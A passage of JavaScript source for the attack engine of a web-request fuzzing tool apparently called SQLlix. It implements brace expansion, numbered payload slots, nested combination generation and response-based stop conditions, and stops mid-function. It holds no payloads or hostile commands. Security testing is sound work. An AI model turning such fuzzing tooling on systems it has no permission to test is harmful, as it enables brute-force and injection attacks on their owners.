/**
 * SQLlix — Attack engine (brace expand, $ slots, runAttack / runDollarAttack, config UI)
 * Depends on window.__sqli bridge from app.js (state, DOM refs, executeOneRequest, …).
 */
(function () {
  function bootAttack() {
    const api = window.__sqli;
    if (!api) {
      console.error('[attack.js] window.__sqli bridge missing — deferring');
      return false;
    }

    // Close over live app bindings
    const state = api.state;
    const $ = api.$;
    const $$ = api.$$;
    const payloadInput = api.payloadInput;
    const methodSelect = api.methodSelect;
    const urlInput = api.urlInput;
    const postBodyInput = api.postBodyInput;
    const sendBtn = api.sendBtn;
    const historyStatusFilter = api.historyStatusFilter;
    const vpanelBackdrop = api.vpanelBackdrop;
    const urlProgressBar = api.urlProgressBar;
    const attackProgressLabel = api.attackProgressLabel;
    const pauseBtn = api.pauseBtn;
    const stopBtn = api.stopBtn;
    const showToast = api.showToast;
    const escapeHtml = api.escapeHtml;
    const executeOneRequest = (...args) => api.executeOneRequest(...args);
    const buildRequestHeaders = (...args) => api.buildRequestHeaders(...args);
    const displayResponse = (...args) => api.displayResponse(...args);
    const renderHistory = (...args) => api.renderHistory(...args);
    const ensureAttackFilterOption = (...args) => api.ensureAttackFilterOption(...args);
    const closeVPanel = (...args) => api.closeVPanel(...args);
    const openVPanel = (...args) => api.openVPanel(...args);
    const setPayloadCollapsed = api.setPayloadCollapsed
      ? (...args) => api.setPayloadCollapsed(...args)
      : () => {};

    // ---- Attack Name Dialog ----
    // ===== Attack Name Dialog (replaces browser prompt) =====
    function promptAttackMeta(defaultName) {
      return new Promise((resolve) => {
        const dialog = $('#attackNameDialog');
        const nameInput = $('#attackNameInput');
        const noteInput = $('#attackNoteInput');
        const btnOk = $('#attackDialogConfirm');
        const btnCancel = $('#attackDialogCancel');
        const btnX = $('#attackDialogCancelX');
        if (!dialog || !nameInput) {
          resolve({ name: defaultName, note: '', cancelled: false });
          return;
        }
        nameInput.value = defaultName || '';
        if (noteInput) noteInput.value = '';
        dialog.classList.add('open');
        // Always above Payload / other vpanels (payload z can be 500+)
        panelZCounter = Math.max(panelZCounter || 460, 500) + 50;
        dialog.style.zIndex = String(Math.max(panelZCounter, 9000));
        if (vpanelBackdrop) {
          vpanelBackdrop.classList.add('open');
          vpanelBackdrop.style.zIndex = String(Math.max(panelZCounter - 1, 8990));
        }
        setTimeout(() => { nameInput.focus(); nameInput.select(); }, 50);

        let resolved = false;
        const onBdClick = (e) => {
          if (e.target === vpanelBackdrop && dialog.classList.contains('open')) onCancel();
        };
        const cleanup = () => {
          dialog.classList.remove('open');
          dialog.style.zIndex = '';
          btnOk.removeEventListener('click', onOk);
          btnCancel.removeEventListener('click', onCancel);
          if (btnX) btnX.removeEventListener('click', onCancel);
          nameInput.removeEventListener('keydown', onKey);
          if (vpanelBackdrop) vpanelBackdrop.removeEventListener('click', onBdClick);
        };
        const restoreBackdropAfterDialog = () => {
          if (!vpanelBackdrop) return;
          vpanelBackdrop.style.zIndex = '';
          // Solo tabs must never stay under a full-page dark veil
          if (document.body.classList.contains('solo-panel')) {
            vpanelBackdrop.classList.remove('open');
            return;
          }
          const needBd = Object.keys(VPANEL_MAP || {}).some((k) => {
            if (k === 'attack-dialog') return false;
            const el = $(VPANEL_MAP[k]);
            return !!(el && el.classList.contains('open') && !el.classList.contains('pinned'));
          });
          if (needBd) vpanelBackdrop.classList.add('open');
          else vpanelBackdrop.classList.remove('open');
        };
        const onOk = () => {
          if (resolved) return;
          resolved = true;
          const name = (nameInput.value || '').trim() || defaultName;
          const note = (noteInput && noteInput.value || '').trim();
          cleanup();
          restoreBackdropAfterDialog();
          resolve({ name, note, cancelled: false });
        };
        const onCancel = () => {
          if (resolved) return;
          resolved = true;
          cleanup();
          restoreBackdropAfterDialog();
          resolve({ name: '', note: '', cancelled: true });
        };
        const onKey = (e) => {
          if (e.key === 'Enter') { e.preventDefault(); onOk(); }
          if (e.key === 'Escape') { e.preventDefault(); onCancel(); }
        };
        btnOk.addEventListener('click', onOk);
        btnCancel.addEventListener('click', onCancel);
        if (btnX) btnX.addEventListener('click', onCancel);
        nameInput.addEventListener('keydown', onKey);
        if (vpanelBackdrop) vpanelBackdrop.addEventListener('click', onBdClick);
      });
    }


    // ---- Brace / $ / runAttack (extracted from app.js) ----
    // ===== Brace Expansion (bash-style) =====
    function expandBraceSegment(seg) {
      // {1..10} or {01..10} or {a..z} or {1,2,3}
      if (seg.includes('..')) {
        const [a, b] = seg.split('..');
        const start = a.trim();
        const end = b.trim();
        // numeric range
        if (/^-?\d+$/.test(start) && /^-?\d+$/.test(end)) {
          const s = parseInt(start, 10);
          const e = parseInt(end, 10);
          const pad = (start[0] === '0' || end[0] === '0') ? Math.max(start.length, end.length) : 0;
          const out = [];
          const step = s <= e ? 1 : -1;
          for (let i = s; step > 0 ? i <= e : i >= e; i += step) {
            out.push(pad ? String(i).padStart(pad, '0') : String(i));
          }
          return out;
        }
        // alpha range (single char)
        if (start.length === 1 && end.length === 1) {
          const out = [];
          const s = start.charCodeAt(0);
          const e = end.charCodeAt(0);
          const step = s <= e ? 1 : -1;
          for (let i = s; step > 0 ? i <= e : i >= e; i += step) {
            out.push(String.fromCharCode(i));
          }
          return out;
        }
      }
      // comma list {1,2,3}
      return seg.split(',').map(x => x.trim()).filter(Boolean);
    }

    function expandBraces(str) {
      const re = /\{([^{}]+)\}/;
      if (!re.test(str)) return [str];
      const results = [str];
      let safety = 0;
      while (safety++ < 20) {
        let expanded = false;
        const next = [];
        for (const item of results) {
          const m = item.match(re);
          if (!m) { next.push(item); continue; }
          expanded = true;
          const variants = expandBraceSegment(m[1]);
          for (const v of variants) {
            next.push(item.slice(0, m.index) + v + item.slice(m.index + m[0].length));
          }
        }
        results.length = 0;
        results.push(...next);
        if (!expanded) break;
      }
      return results;
    }

    function expandAllPayloads() {
      const lines = (payloadInput.value || '').split('\n').filter(l => l.trim() !== '');
      if (lines.length === 0) return [];
      // If any line has braces → batch mode: expand each line, flatten
      const hasBrace = lines.some(l => /\{[^{}]+\}/.test(l));
      if (!hasBrace) return lines.map(l => ({ text: l, isBatch: false }));
      const out = [];
      for (const line of lines) {
        const expanded = expandBraces(line);
        for (const e of expanded) out.push({ text: e, isBatch: true, template: line });
      }
      return out;
    }

    /** $1, $2, … slots inside the payload textarea (nested variable attack). */
    function applyDollarMap(str, map) {
      if (!str) return str || '';
      map = map || {};
      return String(str).replace(/\$(\d+)/g, (full, num) => {
        const n = parseInt(num, 10);
        return Object.prototype.hasOwnProperty.call(map, n) ? String(map[n]) : full;
      });
    }

    function detectDollarSlots() {
      const text = (payloadInput && payloadInput.value) || '';
      const found = new Set();
      const re = /\$(\d+)/g;
      let m;
      while ((m = re.exec(text)) !== null) {
        const n = parseInt(m[1], 10);
        if (n >= 1 && n <= 20) found.add(n);
      }
      return [...found].sort((a, b) => a - b);
    }

    const ATK_SPECIALS = "!@#$%^&*()-_=+[]{}|;:'\",.<>/?`~ \\";

    if (!state.attackSlotConfig) {
      state.attackSlotConfig = { order: [], slots: {} };
    }

    function ensureAttackSlotState(detectedSlots) {
      const cfg = state.attackSlotConfig;
      if (!cfg.slots) cfg.slots = {};
      if (!Array.isArray(cfg.order)) cfg.order = [];
      const detected = (detectedSlots || []).map((n) => +n).filter((n) => n >= 1);
      // Normalize prior order to numbers and drop removed slots
      cfg.order = cfg.order.map((n) => +n).filter((n) => detected.includes(n));
      detected.forEach((n) => {
        if (!cfg.order.includes(n)) cfg.order.push(n);
        if (!cfg.slots[n]) {
          cfg.slots[n] = {
            segments: [{ type: 'range', from: '1', to: '10' }],
            stop: null,
          };
        }
      });
      Object.keys(cfg.slots).forEach((k) => {
        if (!detected.includes(+k)) delete cfg.slots[k];
      });
      return cfg;
    }

    function expandRangeBounds(from, to) {
      const a = String(from ?? '').trim();
      const b = String(to ?? '').trim();
      if (!a || !b) return [];
      // numeric
      if (/^-?\d+$/.test(a) && /^-?\d+$/.test(b)) {
        const s = parseInt(a, 10);
        const e = parseInt(b, 10);
        const pad = (a[0] === '0' || b[0] === '0') ? Math.max(a.length, b.length) : 0;
        const out = [];
        const step = s <= e ? 1 : -1;
        const limit = 10000;
        let n = 0;
        for (let i = s; step > 0 ? i <= e : i >= e; i += step) {
          out.push(pad ? String(i).padStart(pad, '0') : String(i));
          if (++n >= limit) break;
        }
        return out;
      }
      // single-char alpha / any codepoint
      if (a.length === 1 && b.length === 1) {
        const s = a.charCodeAt(0);
        const e = b.charCodeAt(0);
        const out = [];
        const step = s <= e ? 1 : -1;
        for (let i = s; step > 0 ? i <= e : i >= e; i += step) {
          out.push(String.fromCharCode(i));
        }
        return out;
      }
      return [];
    }

    /** Expand one scope segment → list of string values */
    function expandScopeSegment(seg) {
      if (!seg) return [];
      if (seg.type === 'specials') return ATK_SPECIALS.split('');
      if (seg.type === 'list') {
        return String(seg.values || '')
          .split(',')
          .map((x) => x.trim())
          .filter((x) => x.length > 0);
      }
      if (seg.type === 'range') {
        return expandRangeBounds(seg.from, seg.to);
      }
      if (seg.type === 'expr') {
        return expandScopeExpression(seg.expr || '');
      }
      return [];
    }

    /**
     * Parse brace expressions into ordered value lists (concatenated).
     * {1..30} {a..z} {A..F} {#..#} {admin,root,1}
     */
    function expandScopeExpression(src) {
      const text = String(src || '');
      const re = /\{([^{}]*)\}/g;
      const parts = [];
      let m;
      while ((m = re.exec(text)) !== null) {
        parts.push(m[1]);
      }
      if (!parts.length) {
        // bare comma list without braces
        if (text.includes(',')) {
          return text.split(',').map((x) => x.trim()).filter(Boolean);
        }
        return text.trim() ? [text.trim()] : [];
      }
      let out = [];
      parts.forEach((inner) => {
        const t = inner.trim();
        if (t === '#..#' || t === '#' || t.toLowerCase() === 'special' || t.toLowerCase() === 'specials') {
          out = out.concat(ATK_SPECIALS.split(''));
          return;
        }
        if (t.includes('..')) {
          const [a, b] = t.split('..');
          out = out.concat(expandRangeBounds(a, b));
          return;
        }
        // comma list
        out = out.concat(t.split(',').map((x) => x.trim()).filter(Boolean));
      });
      return out;
    }

    function parseExprToSegments(src) {
      const text = String(src || '');
      const re = /\{([^{}]*)\}/g;
      const segs = [];
      let m;
      while ((m = re.exec(text)) !== null) {
        const t = m[1].trim();
        if (t === '#..#' || t === '#' || t.toLowerCase() === 'specials' || t.toLowerCase() === 'special') {
          segs.push({ type: 'specials' });
        } else if (t.includes('..')) {
          const [a, b] = t.split('..');
          segs.push({ type: 'range', from: (a || '').trim(), to: (b || '').trim() });
        } else {
          segs.push({ type: 'list', values: t });
        }
      }
      return segs;
    }

    function valuesForSlot(n) {
      const cfg = state.attackSlotConfig.slots[n];
      if (!cfg || !cfg.segments || !cfg.segments.length) return [];
      let out = [];
      cfg.segments.forEach((seg) => {
        out = out.concat(expandScopeSegment(seg));
      });
      // de-dupe preserve order
      const seen = new Set();
      return out.filter((v) => {
        if (seen.has(v)) return false;
        seen.add(v);
        return true;
      });
    }

    function summarizeSlot(n) {
      const vals = valuesForSlot(n);
      const cfg = state.attackSlotConfig.slots[n];
      const segs = (cfg && cfg.segments) || [];
      const bits = segs.slice(0, 3).map((s) => {
        if (s.type === 'specials') return '{#..#}';
        if (s.type === 'range') return `{${s.from}..${s.to}}`;
        if (s.type === 'list') return `{${String(s.values || '').slice(0, 16)}}`;
        return '?';
      });
      return {
        count: vals.length,
        label: bits.join(' + ') + (segs.length > 3 ? '…' : ''),
        hasStop: !!(cfg && cfg.stop && slotStopEnabled(cfg.stop)),
      };
    }

    function slotStopEnabled(stop) {
      if (!stop) return false;
      return !!(stop.body || stop.url || stop.time || stop.size || stop.status || stop.sizeDiff || stop.header || stop.title);
    }

    function estimateDollarCombos(slotsOrder) {
      let total = 1;
      for (const n of slotsOrder) {
        const c = valuesForSlot(n).length;
        total *= Math.max(1, c);
        if (total > 1e9) return total;
      }
      return total;
    }

    function renderDollarSlotsUI(detectedSlots) {
      const box = $('#atkDollarSlots');
      if (!box) return;
      if (!detectedSlots || !detectedSlots.length) {
        box.innerHTML = '';
        box.hidden = true;
        return;
      }
      box.hidden = false;
      const cfg = ensureAttackSlotState(detectedSlots);
      const order = cfg.order.slice();
      box.innerHTML = order.map((n, idx) => {
        const sum = summarizeSlot(n);
        const depth = idx === 0 ? 'outer' : (idx === order.length - 1 ? 'inner' : 'mid');
        return `<div class="atk-loop-row" draggable="true" data-slot="${n}">
          <span class="atk-loop-grip" title="Drag to reorder">⠿</span>
          <span class="atk-loop-name">$${n}</span>
          <span class="atk-slot-depth">${depth}</span>
          <span class="atk-loop-summary" title="${escapeHtml(sum.label)}">${escapeHtml(sum.label || 'no scope')}</span>
          <span class="atk-slot-count">${sum.count}</span>
          <button type="button" class="btn btn-sm atk-loop-scope" data-slot="${n}">Scope</button>
          <button type="button" class="btn btn-sm atk-loop-stop${sum.hasStop ? ' has-stop' : ''}" data-slot="${n}">Stop</button>
        </div>`;
      }).join('');

      // Drag reorder
      let dragN = null;
      box.querySelectorAll('.atk-loop-row').forEach((row) => {
        row.addEventListener('dragstart', (e) => {
          dragN = +row.dataset.slot;
          row.classList.add('dragging');
          e.dataTransfer.effectAllowed = 'move';
        });
        row.addEventListener('dragend', () => {
          row.classList.remove('dragging');
          dragN = null;
        });
        row.addEventListener('dragover', (e) => {
          e.preventDefault();
          row.classList.add('drag-over');
        });
        row.addEventListener('dragleave', () => row.classList.remove('drag-over'));
        row.addEventListener('drop', (e) => {
          e.preventDefault();
          row.classList.remove('drag-over');
          const target = +row.dataset.slot;
          if (dragN == null || dragN === target) return;
          const ord = state.attackSlotConfig.order;
          const from = ord.indexOf(dragN);
          const to = ord.indexOf(target);
          if (from < 0 || to < 0) return;
          ord.splice(from, 1);
          ord.splice(to, 0, dragN);
          state.attackComboList = null;
          renderDollarSlotsUI(detectedSlots);
          refreshAttackPanelCounts();
        });
        row.querySelector('.atk-loop-scope')?.addEventListener('click', (e) => {
          e.stopPropagation();
          openAttackScopeEditor(+row.dataset.slot);
        });
        row.querySelector('.atk-loop-stop')?.addEventListener('click', (e) => {
          e.stopPropagation();
          openAttackSlotStop(+row.dataset.slot);
        });
      });
    }

    function refreshAttackPanelCounts() {
      const mode = detectAttackMode();
      if (!attackExpandCount) return;
      if (mode.mode === 'dollar') {
        const order = state.attackSlotConfig.order || mode.slots;
        const n = estimateDollarCombos(order);
        attackExpandCount.textContent = n > 1000000 ? `~${(n / 1e6).toFixed(1)}M` : String(n);
      } else if (mode.payloads) {
        attackExpandCount.textContent = `${mode.payloads.length} payloads`;
      }
    }

    // ---- Scope editor ----
    let _scopeEditSlot = null;
    let _scopeEditSegments = [];

    function openAttackScopeEditor(n) {
      _scopeEditSlot = n;
      const cfg = ensureAttackSlotState(detectDollarSlots()).slots[n] || { segments: [] };
      _scopeEditSegments = JSON.parse(JSON.stringify(cfg.segments || []));
      const title = $('#attackScopeTitle');
      if (title) title.textContent = `$${n} Scope`;
      const expr = $('#atkScopeExpr');
      if (expr) expr.value = '';
      renderScopeSegmentsEditor();
      if (typeof openVPanel === 'function') openVPanel('attack-scope');
      else $('#attackScopePanel')?.classList.add('open');
    }

    function renderScopeSegmentsEditor() {
      const box = $('#atkScopeSegments');
      if (!box) return;
      if (!_scopeEditSegments.length) {
        box.innerHTML = '<div class="adv-hint">No segments — add a range, specials, or list.</div>';
      } else {
        box.innerHTML = _scopeEditSegments.map((seg, i) => {
          if (seg.type === 'specials') {
            return `<div class="atk-seg-row" data-i="${i}">
              <span class="atk-seg-label">{#..#} specials</span>
              <span class="atk-slot-count">${ATK_SPECIALS.length}</span>
              <button type="button" class="btn btn-sm btn-ghost atk-seg-del" data-i="${i}">✕</button>
            </div>`;
          }
          if (seg.type === 'range') {
            return `<div class="atk-seg-row" data-i="${i}">
              <span class="atk-seg-label">Range</span>
              <input type="text" class="atk-seg-from" data-i="${i}" value="${escapeHtml(seg.from || '')}" placeholder="from" spellcheck="false" />
              <span>.. </span>
              <input type="text" class="atk-seg-to" data-i="${i}" value="${escapeHtml(seg.to || '')}" placeholder="to" spellcheck="false" />
              <span class="atk-slot-count">${expandRangeBounds(seg.from, seg.to).length}</span>
              <button type="button" class="btn btn-sm btn-ghost atk-seg-del" data-i="${i}">✕</button>
            </div>`;
          }
          // list
          return `<div class="atk-seg-row" data-i="${i}">
            <span class="atk-seg-label">List</span>
            <input type="text" class="atk-seg-list" data-i="${i}" value="${escapeHtml(seg.values || '')}" placeholder="a,b,c" spellcheck="false" style="flex:1;" />
            <button type="button" class="btn btn-sm btn-ghost atk-seg-del" data-i="${i}">✕</button>
          </div>`;
        }).join('');
      }
      box.querySelectorAll('.atk-seg-del').forEach((btn) => {
        btn.addEventListener('click', () => {
          _scopeEditSegments.splice(+btn.dataset.i, 1);
          renderScopeSegmentsEditor();
        });
      });
      box.querySelectorAll('.atk-seg-from').forEach((inp) => {
        inp.addEventListener('input', () => {
          _scopeEditSegments[+inp.dataset.i].from = inp.value;
          renderScopePreviewOnly();
        });
      });
      box.querySelectorAll('.atk-seg-to').forEach((inp) => {
        inp.addEventListener('input', () => {
          _scopeEditSegments[+inp.dataset.i].to = inp.value;
          renderScopePreviewOnly();
        });
      });
      box.querySelectorAll('.atk-seg-list').forEach((inp) => {
        inp.addEventListener('input', () => {
          _scopeEditSegments[+inp.dataset.i].values = inp.value;
          renderScopePreviewOnly();
        });
      });
      renderScopePreviewOnly();
    }

    function renderScopePreviewOnly() {
      let vals = [];
      _scopeEditSegments.forEach((seg) => { vals = vals.concat(expandScopeSegment(seg)); });
      const seen = new Set();
      vals = vals.filter((v) => { if (seen.has(v)) return false; seen.add(v); return true; });
      const countEl = $('#atkScopePreviewCount');
      if (countEl) countEl.textContent = String(vals.length);
      const prev = $('#atkScopePreview');
      if (prev) {
        const show = vals.slice(0, 40);
        prev.innerHTML = show.map((v) => `<code>${escapeHtml(v)}</code>`).join(' ')
          + (vals.length > 40 ? ` <span class="atk-mode-hint">+${vals.length - 40} more</span>` : '');
      }
    }

    function bindAttackScopeUI() {
      function addSeg(seg) {
        if (!Array.isArray(_scopeEditSegments)) _scopeEditSegments = [];
        _scopeEditSegments.push(seg);
        renderScopeSegmentsEditor();
      }
      $('#atkScopeAddRange')?.addEventListener('click', (e) => {
        e.preventDefault();
        e.stopPropagation();
        addSeg({ type: 'range', from: '1', to: '10' });
      });
      $('#atkScopeAddSpecials')?.addEventListener('click', (e) => {
        e.preventDefault();
        e.stopPropagation();
        addSeg({ type: 'specials' });
      });
      $('#atkScopeAddList')?.addEventListener('click', (e) => {
        e.preventDefault();
        e.stopPropagation();
        addSeg({ type: 'list', values: '' });
      });
      function doParseExpr() {
        const expr = ($('#atkScopeExpr')?.value || '').trim();
        if (!expr) { showToast('Expression is empty'); return; }
        let segs = parseExprToSegments(expr);
        // fallback: bare "1..20" or "a,b,c" without braces
        if (!segs.length && expr.includes('..')) {
          const [a, b] = expr.split('..');
          segs = [{ type: 'range', from: (a || '').trim(), to: (b || '').trim() }];
        }
        if (!segs.length && expr.includes(',')) {
          segs = [{ type: 'list', values: expr }];
        }
        if (!segs.length) {
          showToast('Nothing detected — use {1..20} or {a..z} or {a,b,c}');
          return;
        }
        _scopeEditSegments = segs;
        renderScopeSegmentsEditor();
        showToast(`Parsed ${segs.length} segment(s)`, 'success');
      }
      $('#atkScopeParseExpr')?.addEventListener('click', (e) => {
        e.preventDefault();
        e.stopPropagation();
        doParseExpr();
      });
      $('#atkScopeExpr')?.addEventListener('keydown', (e) => {
        if (e.key === 'Enter') {
          e.preventDefault();
          doParseExpr();
        }
      });
      $('#atkScopeSaveBtn')?.addEventListener('click', (e) => {
        e.preventDefault();
        e.stopPropagation();
        if (_scopeEditSlot == null) return;
        const n = _scopeEditSlot;
        ensureAttackSlotState(detectDollarSlots());
        state.attackSlotConfig.slots[n].segments = JSON.parse(JSON.stringify(_scopeEditSegments));
        state.attackComboList = null; // scopes changed → rebuild combos
        if (typeof closeVPanel === 'function') closeVPanel('attack-scope');
        else $('#attackScopePanel')?.classList.remove('open');
        renderDollarSlotsUI(detectDollarSlots());
        refreshAttackPanelCounts();
        showToast(`$${n} scope saved`, 'success');
      });
    }

    // ---- Per-slot stop ----
    let _stopEditSlot = null;

    function openAttackSlotStop(n) {
      _stopEditSlot = n;
      const title = $('#attackSlotStopTitle');
      if (title) title.textContent = `$${n} Stop`;
      const cfg = ensureAttackSlotState(detectDollarSlots()).slots[n] || {};
      const stop = cfg.stop || {};
      const set = (id, val, isCheck) => {
        const el = $(id);
        if (!el) return;
        if (isCheck) el.checked = !!val;
        else el.value = val != null ? val : '';
      };
      set('#slotStopBody', stop.body, true);
      set('#slotStopBodyVal', stop.bodyVal || '');
      set('#slotStopUrl', stop.url, true);
      set('#slotStopUrlVal', stop.urlVal || '');
      set('#slotStopTime', stop.time, true);
      set('#slotStopTimeVal', stop.timeVal != null ? stop.timeVal : '');
      set('#slotStopStatus', stop.status, true);
      set('#slotStopStatusVal', stop.statusVal || '');
      set('#slotStopSize', stop.size, true);
      set('#slotStopSizeOp', stop.sizeOp || 'gt');
      set('#slotStopSizeVal', stop.sizeVal != null ? stop.sizeVal : '');
      set('#slotStopSizeDiff', stop.sizeDiff, true);
      set('#slotStopSizeDiffVal', stop.sizeDiffVal != null ? stop.sizeDiffVal : '50');
      set('#slotStopHeader', stop.header, true);
      set('#slotStopHeaderVal', stop.headerVal || '');
      set('#slotStopTitle', stop.title, true);
      set('#slotStopTitleVal', stop.titleVal || '');
      if (typeof openVPanel === 'function') openVPanel('attack-slot-stop');
      else $('#attackSlotStopPanel')?.classList.add('open');
    }

    function readSlotStopForm() {
      return {
        body: !!$('#slotStopBody')?.checked,
        bodyVal: $('#slotStopBodyVal')?.value || '',
        url: !!$('#slotStopUrl')?.checked,
        urlVal: $('#slotStopUrlVal')?.value || '',
        time: !!$('#slotStopTime')?.checked,
        timeVal: +($('#slotStopTimeVal')?.value || 0),
        status: !!$('#slotStopStatus')?.checked,
        statusVal: $('#slotStopStatusVal')?.value || '',
        size: !!$('#slotStopSize')?.checked,
        sizeOp: $('#slotStopSizeOp')?.value || 'gt',
        sizeVal: +($('#slotStopSizeVal')?.value || 0),
        sizeDiff: !!$('#slotStopSizeDiff')?.checked,
        sizeDiffVal: +($('#slotStopSizeDiffVal')?.value || 50),
        header: !!$('#slotStopHeader')?.checked,
        headerVal: $('#slotStopHeaderVal')?.value || '',
        title: !!$('#slotStopTitle')?.checked,
        titleVal: $('#slotStopTitleVal')?.value || '',
      };
    }

    function shouldStopSlot(entry, stop, baselineSize) {
      if (!stop || !slotStopEnabled(stop)) return false;
      const checks = [];
      const body = entry.response?.body || '';
      const respStatus = entry.response?.status;

      function testRegex(raw, hay) {
        if (!raw) return false;
        const inv = raw.startsWith('!');
        const pat = inv ? raw.slice(1) : raw;
        try {
          const re = new RegExp(pat, 'i');
          const hit = re.test(hay || '');
          return inv ? !hit : hit;
        } catch {
          return false;
        }
      }

      if (stop.body && stop.bodyVal) checks.push(testRegex(stop.bodyVal, body));
      if (stop.url && stop.urlVal) checks.push(testRegex(stop.urlVal, entry.url || ''));
      if (stop.time) checks.push((entry.response?.timeMs || 0) >= (stop.timeVal || 0));

      if (stop.status && stop.statusVal) {
        const raw = String(stop.statusVal).trim();
        const inv = raw.startsWith('!');
        const list = (inv ? raw.slice(1) : raw).split(/[,\s]+/).map((x) => x.trim()).filter(Boolean);
        const hit = list.some((c) => String(respStatus) === c);
        checks.push(inv ? !hit : hit);
      }

      if (stop.size) {
        const sz = body.length;
        const v = stop.sizeVal || 0;
        if (stop.sizeOp === 'lt') checks.push(sz <= v);
        else if (stop.sizeOp === 'eq') checks.push(sz === v);
        else checks.push(sz >= v);
      }

      if (stop.sizeDiff && baselineSize != null) {
        const delta = Math.abs(body.length - baselineSize);
        checks.push(delta >= (stop.sizeDiffVal || 0));
      }

      if (stop.header && stop.headerVal) {
        const hdrs = entry.response?.headers || {};
        const flat = Object.entries(hdrs).map(([k, v]) => `${k}: ${v}`).join('\n');
        checks.push(testRegex(stop.headerVal, flat));
      }

      if (stop.title && stop.titleVal) {
        let title = '';
        const mTitle = body.match(/<title[^>]*>([\s\S]*?)<\/title>/i);
        if (mTitle) title = mTitle[1].replace(/\s+/g, ' ').trim();
        checks.push(testRegex(stop.titleVal, title));
      }

      return checks.length > 0 && checks.every(Boolean);
    }

    function bindAttackSlotStopUI() {
      $('#slotStopSaveBtn')?.addEventListener('click', () => {
        if (_stopEditSlot == null) return;
        const n = _stopEditSlot;
        ensureAttackSlotState(detectDollarSlots());
        state.attackSlotConfig.slots[n].stop = readSlotStopForm();
        if (typeof closeVPanel === 'function') closeVPanel('attack-slot-stop');
        else $('#attackSlotStopPanel')?.classList.remove('open');
        renderDollarSlotsUI(detectDollarSlots());
        showToast(`$${n} stop saved`, 'success');
      });
      $('#slotStopClear')?.addEventListener('click', () => {
        ['#slotStopBody', '#slotStopUrl', '#slotStopTime', '#slotStopStatus', '#slotStopSize', '#slotStopSizeDiff', '#slotStopHeader', '#slotStopTitle'].forEach((id) => {
          const el = $(id); if (el) el.checked = false;
        });
      });
    }


    // ---- Combinations viewer (search / edit / delete) ----
    const ATK_COMBOS_UI_CAP = 8000;

    function materializeAttackCombos() {
      const slots = detectDollarSlots();
      ensureAttackSlotState(slots);
      const order = (state.attackSlotConfig.order || slots).slice();
      const domains = order.map((n) => ({ n, values: valuesForSlot(n) }));
      if (domains.some((d) => !d.values.length)) return [];
      let total = 1;
      domains.forEach((d) => { total *= d.values.length; });
      if (total > ATK_COMBOS_UI_CAP) {
        showToast(`Showing first ${ATK_COMBOS_UI_CAP} of ${total} combos`);
      }
      const out = [];
      function rec(level, map) {
        if (out.length >= ATK_COMBOS_UI_CAP) return;
        if (level >= domains.length) {
          const m = { ...map };
          const payload = applyDollarMap((payloadInput.value || '').trim(), m);
          out.push({ id: out.length + 1, map: m, payload });
          return;
        }
        const d = domains[level];
        for (let i = 0; i < d.values.length; i++) {
          if (out.length >= ATK_COMBOS_UI_CAP) return;
          map[d.n] = d.values[i];
          rec(level + 1, map);
        }
      }
      rec(0, {});
      return out;
    }

    function ensureAttackComboList() {
      if (!Array.isArray(state.attackComboList)) {
        state.attackComboList = materializeAttackCombos();
      }
      return state.attackComboList;
    }

    function openAttackCombosPanel() {
      try {
        ensureAttackComboList();
        renderAttackCombosList();
        const panel = $('#attackCombosPanel');
        if (typeof openVPanel === 'function') {
          openVPanel('attack-combos');
        } else if (panel) {
          panel.classList.add('open');
        }
        if (panel) {
          panel.style.zIndex = String(Math.max((typeof panelZCounter === 'number' ? panelZCounter : 500) + 20, 600));
        }
        if (vpanelBackdrop) {
          vpanelBackdrop.classList.add('open');
        }
      } catch (err) {
        console.error('[combos] open failed', err);
        showToast('Combos open failed: ' + (err && err.message ? err.message : err));
      }
    }

    function renderAttackCombosList() {
      const list = ensureAttackComboList();
      const q = (($('#atkCombosSearch')?.value) || '').trim().toLowerCase();
      const box = $('#atkCombosList');
      const countEl = $('#atkCombosCount');
      if (!box) return;
      const filtered = !q ? list : list.filter((row) => {
        const mapStr = Object.entries(row.map).map(([k, v]) => `$${k}=${v}`).join(' ');
        return (mapStr + ' ' + (row.payload || '')).toLowerCase().includes(q);
      });
      if (countEl) countEl.textContent = `${filtered.length}/${list.length}`;
      if (!filtered.length) {
        box.innerHTML = '<div class="adv-hint">No combinations</div>';
        return;
      }
      box.innerHTML = filtered.map((row) => {
        const mapStr = Object.entries(row.map).map(([k, v]) => `$${k}=${escapeHtml(String(v))}`).join(' ');
        return `<div class="atk-combo-row" data-id="${row.id}">
          <div class="atk-combo-map">${mapStr}</div>
          <div class="atk-combo-payload" title="${escapeHtml(row.payload || '')}">${escapeHtml((row.payload || '').slice(0, 80))}</div>
          <button type="button" class="btn btn-sm btn-ghost atk-combo-edit" data-id="${row.id}">Edit</button>
          <button type="button" class="btn btn-sm btn-ghost atk-combo-del" data-id="${row.id}">✕</button>
        </div>`;
      }).join('');
      box.querySelectorAll('.atk-combo-del').forEach((btn) => {
        btn.addEventListener('click', () => {
          const id = +btn.dataset.id;
          state.attackComboList = ensureAttackComboList().filter((r) => r.id !== id);
          refreshAttackPanelCountsFromList();
          renderAttackCombosList();
        });
      });
      box.querySelectorAll('.atk-combo-edit').forEach((btn) => {
        btn.addEventListener('click', () => {
          const id = +btn.dataset.id;
          const row = ensureAttackComboList().find((r) => r.id === id);
          if (!row) return;
          const keys = Object.keys(row.map).sort((a, b) => +a - +b);
          const next = {};
          for (const k of keys) {
            const v = prompt(`Value for $${k}`, String(row.map[k]));
            if (v === null) return;
            next[k] = v;
          }
          row.map = next;
          row.payload = applyDollarMap((payloadInput.value || '').trim(), next);
          renderAttackCombosList();
        });
      });
    }

    function refreshAttackPanelCountsFromList() {
      if (attackExpandCount && Array.isArray(state.attackComboList)) {
        attackExpandCount.textContent = String(state.attackComboList.length);
      }
    }

    function bindAttackCombosUI() {
      if (window.__atkCombosDelegated) return;
      window.__atkCombosDelegated = true;
      document.addEventListener('click', (e) => {
        const openBtn = e.target && e.target.closest && e.target.closest('#atkCombosOpenBtn');
        if (openBtn) {
          e.preventDefault();
          e.stopPropagation();
          openAttackCombosPanel();
          return;
        }
        const resetBtn = e.target && e.target.closest && e.target.closest('#atkCombosReset');
        if (resetBtn) {
          e.preventDefault();
          state.attackComboList = materializeAttackCombos();
          refreshAttackPanelCountsFromList();
          renderAttackCombosList();
          showToast('Combos rebuilt from scopes', 'success');
        }
      });
      document.addEventListener('input', (e) => {
        if (e.target && e.target.id === 'atkCombosSearch') renderAttackCombosList();
      });
    }


    function detectAttackMode() {
      const slots = detectDollarSlots();
      if (slots.length > 0) {
        ensureAttackSlotState(slots);
        return { isBatch: true, mode: 'dollar', slots, payloads: [] };
      }
      const payloads = expandAllPayloads();
